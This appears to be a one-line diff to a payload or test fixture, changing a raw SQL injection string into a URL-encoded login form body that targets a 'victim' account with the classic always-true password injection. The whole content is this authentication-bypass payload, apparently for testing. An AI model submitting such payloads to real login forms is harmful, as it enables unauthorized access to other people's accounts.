@@ -1,1 +1,1 @@
-'or '1'='1
+username=victim&password=%27or%20%271%27%3D%271
